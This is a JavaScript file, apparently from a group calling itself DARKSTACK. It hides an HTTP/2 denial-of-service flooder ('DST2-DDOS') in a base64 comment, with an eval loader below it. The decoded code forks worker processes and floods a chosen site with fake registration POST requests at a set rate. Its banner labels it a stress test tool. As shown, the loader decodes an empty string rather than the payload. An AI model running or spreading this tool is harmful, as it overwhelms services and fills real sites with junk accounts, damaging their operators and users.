// TranHaoEncrypt:DARKSTACK
// MODE:BASE64
// DATA:Y29uc3QgaHR0cDIgPSByZXF1aXJlKCJodHRwMiIpOwpjb25zdCB0bHMgPSByZXF1aXJlKCJ0bHMiKTsKY29uc3QgY2x1c3RlciA9IHJlcXVpcmUoImNsdXN0ZXIiKTsKY29uc3QgdXJsID0gcmVxdWlyZSgidXJsIik7CmNvbnN0IGNyeXB0byA9IHJlcXVpcmUoImNyeXB0byIpOwpjb25zdCBvcyA9IHJlcXVpcmUoIm9zIik7CmNvbnN0IGNvbG9ycyA9IHJlcXVpcmUoImNvbG9ycyIpOwoKaWYgKHByb2Nlc3MuYXJndi5sZW5ndGggPCA1KSB7CiAgICBjb25zb2xlLmNsZWFyKCk7CiAgICBjb25zb2xlLmxvZyhgCiQkJCQkJCQkXFwgICAkJCQkJCRcXCAkJCQkJCQkJFxcICAkJCQkJCRcXCAgICAgICAgICAgICAgICAgICAgICAkJCQkJCQkXFwgICQkJCQkJCRcXCAgICQkJCQkJFxcICAgJCQkJCQkXFwgIAokJCAgX18kJFxcICQkICBfXyQkXFxcXF9fJCQgIF9ffCQkICBfXyQkXFwgICAgICAgICAgICAgICAgICAgICAkJCAgX18kJFxcICQkICBfXyQkXFwgJCQgIF9fJCRcXCAkJCAgX18kJFxcIAokJCB8ICAkJCB8JCQgLyAgXFxfX3wgICQkIHwgICBcXF9fLyAgJCQgfCAgICAgICAgICAgICAgICAgICAgJCQgfCAgJCQgfCQkIHwgICQkIHwkJCAvICAkJCB8JCQgLyAgXFxfX3wKJCQgfCAgJCQgfFxcJCQkJCQkXFwgICAgJCQgfCAgICAkJCQkJCQgIHwgICAgICAkJCQkJCRcXCAgICAgICAkJCB8ICAkJCB8JCQgfCAgJCQgfCQkIHwgICQkIHxcXCQkJCQkJFxcICAKJCQgfCAgJCQgfCBcXF9fX18kJFxcICAgJCQgfCAgICQkICBfX19fLyAgICAgICBcXF9fX19fX3wgICAgICAkJCB8ICAkJCB8JCQgfCAgJCQgfCQkIHwgICQkIHwgXFxfX19fJCRcXCAKJCQgfCAgJCQgfCQkXFwgICAkJCB8ICAkJCB8ICAgJCQgfCAgICAgICAgICAgICAgICAgICAgICAgICAgJCQgfCAgJCQgfCQkIHwgICQkIHwkJCB8ICAkJCB8JCRcXCAgICQkIHwKJCQkJCQkJCAgfFxcJCQkJCQkICB8ICAkJCB8ICAgJCQkJCQkJCRcXCAgICAgICAgICAgICAgICAgICAgICQkJCQkJCQgIHwkJCQkJCQkICB8ICQkJCQkJCAgfFxcJCQkJCQkICB8ClxcX19fX19fXy8gIFxcX19fX19fLyAgIFxcX198ICAgXFxfX19fX19fX3wgICAgICAgICAgICAgICAgICAgIFxcX19fX19fXy8gXFxfX19fX19fLyAgXFxfX19fX18vICBcXF9fX19fXy8gCgrilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcK4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERTVDItRERPUyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgSFRUUC8yIFN0cmVzcyBUZXN0IFRvb2wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgVG9vbCBOYW1lIDogRFNUMi1ERE9TICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICBQcm90b2NvbCAgOiBIVFRQLzIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgIFRlYW0gICAgICA6IERBUktTVEFDSyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgVGVsZSAgICAgIDogQEhhb21pbGtubiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRCuKVkSAgICAgICAgICAgICAgwqkgMjAyNSB8IENo4bunIHF1eeG7gW46IFRS4bqmTiBIw4BPIERFViAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0KClVzYWdlOiBub2RlIERzdDIuanMgPGhvc3Q+IDx0aW1lPiA8dGhyZWFkcz4gPHJhdGU+CmApOwogICAgcHJvY2Vzcy5leGl0KCk7Cn0KCgpjb25zdCBhcmdzID0gewogICAgdGFyZ2V0OiBwcm9jZXNzLmFyZ3ZbMl0sCiAgICB0aW1lOiB+fnByb2Nlc3MuYXJndlszXSwKICAgIHRocmVhZHM6IH5+cHJvY2Vzcy5hcmd2WzRdLAogICAgcmF0ZTogfn5wcm9jZXNzLmFyZ3ZbNV0KfTsKCmNvbnN0IHBhcnNlZFRhcmdldCA9IHVybC5wYXJzZShhcmdzLnRhcmdldCk7CmNvbnN0IGNpcGhlcnMgPSAiVExTX0FFU18xMjhfR0NNX1NIQTI1NjpUTFNfQUVTXzI1Nl9HQ01fU0hBMzg0IjsKY29uc3Qgc2lnYWxncyA9ICJlY2RzYV9zZWNwMjU2cjFfc2hhMjU2OnJzYV9wc3NfcnNhZV9zaGEyNTYiOwpjb25zdCBzZWN1cmVPcHRpb25zID0gY3J5cHRvLmNvbnN0YW50cy5TU0xfT1BfTk9fU1NMdjIgfCBjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9OT19TU0x2MyB8IGNyeXB0by5jb25zdGFudHMuU1NMX09QX05PX1RMU3YxOwoKaWYgKGNsdXN0ZXIuaXNNYXN0ZXIpIHsKICAgIGNvbnNvbGUuY2xlYXIoKTsKCiAgICBmb3IgKGxldCBpID0gMTsgaSA8PSBhcmdzLnRocmVhZHM7IGkrKykgewogICAgICAgIGNsdXN0ZXIuZm9yaygpOwogICAgfQoKICAgIHNldEludGVydmFsKCgpID0+IHsKICAgICAgICBjb25zdCB1c2VkUkFNID0gKChvcy50b3RhbG1lbSgpIC0gb3MuZnJlZW1lbSgpKSAvIG9zLnRvdGFsbWVtKCkgKiAxMDApLnRvRml4ZWQoMik7CiAgICB9LCA1MDAwKTsKCiAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICBwcm9jZXNzLmV4aXQoMCk7CiAgICB9LCBhcmdzLnRpbWUgKiAxMDAwKTsKfSBlbHNlIHsKICAgIHJ1bkZsb29kZXIoKTsKfQoKZnVuY3Rpb24gcmFuZE51bShsZW5ndGgpIHsKICAgIHJldHVybiBjcnlwdG8ucmFuZG9tQnl0ZXMobGVuZ3RoKS50b1N0cmluZygiaGV4Iikuc2xpY2UoMCwgbGVuZ3RoKTsKfQoKZnVuY3Rpb24gZ2VuZXJhdGVQb3N0RGF0YSgpIHsKICAgIGNvbnN0IHJhbmRvbTUgPSByYW5kTnVtKDUpOwogICAgY29uc3QgcmFuZG9tNCA9IHJhbmROdW0oNCk7CiAgICBjb25zdCByYW5kb203ID0gcmFuZE51bSg3KTsKICAgIHJldHVybiBuZXcgVVJMU2VhcmNoUGFyYW1zKHsKICAgICAgICB1c2VybmFtZTogYHRyYW5oYW9kZXYke3JhbmRvbTV9YCwKICAgICAgICBlbWFpbDogYHRyYW5oYW9kZXYke3JhbmRvbTR9QGdtYWlsLmNvbWAsCiAgICAgICAgcGFzc3dvcmQ6IGB0cmFuaGFvZGV2JHtyYW5kb203fWAsCiAgICAgICAgcmVwYXNzd29yZDogYHRyYW5oYW9kZXYke3JhbmRvbTd9YAogICAgfSkudG9TdHJpbmcoKTsKfQoKZnVuY3Rpb24gY3JlYXRlVExTQ29ubmVjdGlvbigpIHsKICAgIHJldHVybiB0bHMuY29ubmVjdCg0NDMsIHBhcnNlZFRhcmdldC5ob3N0LCB7CiAgICAgICAgQUxQTlByb3RvY29sczogWyJoMiJdLAogICAgICAgIGNpcGhlcnM6IGNpcGhlcnMsCiAgICAgICAgc2lnYWxnczogc2lnYWxncywKICAgICAgICByZWplY3RVbmF1dGhvcml6ZWQ6IGZhbHNlLAogICAgICAgIHNlY3VyZU9wdGlvbnM6IHNlY3VyZU9wdGlvbnMsCiAgICAgICAgc2VydmVybmFtZTogcGFyc2VkVGFyZ2V0Lmhvc3QsCiAgICAgICAgc2VjdXJlUHJvdG9jb2w6ICJUTFNfbWV0aG9kIgogICAgfSk7Cn0KCmZ1bmN0aW9uIHJ1bkZsb29kZXIoKSB7CiAgICBsZXQgdG90YWxTdWNjZXNzID0gMDsKICAgIGxldCBjbGllbnQsIHRsc0Nvbm47CgogICAgY29uc3QgY29ubmVjdCA9ICgpID0+IHsKICAgICAgICB0bHNDb25uID0gY3JlYXRlVExTQ29ubmVjdGlvbigpOwogICAgICAgIHRsc0Nvbm4uc2V0S2VlcEFsaXZlKHRydWUsIDYwMDAwKTsKICAgICAgICB0bHNDb25uLnNldE5vRGVsYXkodHJ1ZSk7CgogICAgICAgIGNsaWVudCA9IGh0dHAyLmNvbm5lY3QocGFyc2VkVGFyZ2V0LmhyZWYsIHsKICAgICAgICAgICAgY3JlYXRlQ29ubmVjdGlvbjogKCkgPT4gdGxzQ29ubiwKICAgICAgICAgICAgc2V0dGluZ3M6IHsKICAgICAgICAgICAgICAgIGhlYWRlclRhYmxlU2l6ZTogNjU1MzYsCiAgICAgICAgICAgICAgICBtYXhIZWFkZXJMaXN0U2l6ZTogMzI3NjgsCiAgICAgICAgICAgICAgICBpbml0aWFsV2luZG93U2l6ZTogNjI5MTQ1NiwKICAgICAgICAgICAgICAgIG1heEZyYW1lU2l6ZTogMTYzODQKICAgICAgICAgICAgfQogICAgICAgIH0pOwoKICAgICAgICBjbGllbnQub24oImVycm9yIiwgKCkgPT4gewogICAgICAgICAgICBjbGllbnQuZGVzdHJveSgpOwogICAgICAgICAgICB0bHNDb25uLmRlc3Ryb3koKTsKICAgICAgICAgICAgc2V0VGltZW91dChjb25uZWN0LCAxMDAwKTsKICAgICAgICB9KTsKCiAgICAgICAgY2xpZW50Lm9uKCJjbG9zZSIsICgpID0+IHsKICAgICAgICAgICAgY2xpZW50LmRlc3Ryb3koKTsKICAgICAgICAgICAgdGxzQ29ubi5kZXN0cm95KCk7CiAgICAgICAgfSk7CiAgICB9OwoKICAgIGNvbm5lY3QoKTsKCiAgICBjb25zdCBoZWFkZXJzID0gewogICAgICAgICI6YXV0aG9yaXR5IjogcGFyc2VkVGFyZ2V0Lmhvc3QsCiAgICAgICAgIjpzY2hlbWUiOiAiaHR0cHMiLAogICAgICAgICI6cGF0aCI6IHBhcnNlZFRhcmdldC5wYXRoLAogICAgICAgICI6bWV0aG9kIjogIlBPU1QiLAogICAgICAgICJhY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjkiLAogICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSwgYnIiLAogICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLAogICAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwKICAgICAgICAib3JpZ2luIjogYGh0dHBzOi8vJHtwYXJzZWRUYXJnZXQuaG9zdH1gLAogICAgICAgICJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiBDaHJvbWUvOTEuMC40NDcyLjEyNCBTYWZhcmkvNTM3LjM2IgogICAgfTsKCiAgICBjb25zdCBzZW5kUmVxdWVzdCA9ICgpID0+IHsKICAgICAgICBjb25zdCBwb3N0RGF0YSA9IGdlbmVyYXRlUG9zdERhdGEoKTsKICAgICAgICBoZWFkZXJzWyJjb250ZW50LWxlbmd0aCJdID0gQnVmZmVyLmJ5dGVMZW5ndGgocG9zdERhdGEpOwoKICAgICAgICBjb25zdCByZXF1ZXN0ID0gY2xpZW50LnJlcXVlc3QoaGVhZGVycykKICAgICAgICAgICAgLm9uKCJyZXNwb25zZSIsIChyZXNwb25zZUhlYWRlcnMpID0+IHsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZUhlYWRlcnNbIjpzdGF0dXMiXSA+PSAyMDAgJiYgcmVzcG9uc2VIZWFkZXJzWyI6c3RhdHVzIl0gPCAzMDApIHsKICAgICAgICAgICAgICAgICAgICB0b3RhbFN1Y2Nlc3MrKzsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgU3VjY2VzczogJHt0b3RhbFN1Y2Nlc3N9YC55ZWxsb3cpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVxdWVzdC5jbG9zZSgpOwogICAgICAgICAgICAgICAgcmVxdWVzdC5kZXN0cm95KCk7CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIC5vbigiZXJyb3IiLCAoKSA9PiB7CiAgICAgICAgICAgICAgICByZXF1ZXN0LmNsb3NlKCk7CiAgICAgICAgICAgICAgICByZXF1ZXN0LmRlc3Ryb3koKTsKICAgICAgICAgICAgICAgIHNldEltbWVkaWF0ZShzZW5kUmVxdWVzdCk7CiAgICAgICAgICAgIH0pOwoKICAgICAgICByZXF1ZXN0LndyaXRlKHBvc3REYXRhKTsKICAgICAgICByZXF1ZXN0LmVuZCgpOwogICAgfTsKCiAgICBjb25zdCBpbnRlcnZhbCA9IHNldEludGVydmFsKCgpID0+IHsKICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyZ3MucmF0ZTsgaSsrKSB7CiAgICAgICAgICAgIGlmICghY2xpZW50IHx8IGNsaWVudC5kZXN0cm95ZWQpIHsKICAgICAgICAgICAgICAgIGNvbm5lY3QoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBzZW5kUmVxdWVzdCgpOwogICAgICAgIH0KICAgIH0sIDEwMDApOwogICAgcHJvY2Vzcy5vbigiZXhpdCIsICgpID0+IHsKICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTsKICAgICAgICBpZiAoY2xpZW50KSBjbGllbnQuZGVzdHJveSgpOwogICAgICAgIGlmICh0bHNDb25uKSB0bHNDb25uLmRlc3Ryb3koKTsKICAgIH0pOwp9Cgpwcm9jZXNzLm9uKCJ1bmNhdWdodEV4Y2VwdGlvbiIsIChlcnIpID0+IHsKfSk7Cgpwcm9jZXNzLm9uKCJ1bmhhbmRsZWRSZWplY3Rpb24iLCAoZXJyKSA9PiB7Cn0pOwo=

const code = Buffer.from("", "base64").toString("utf-8");
eval(code);
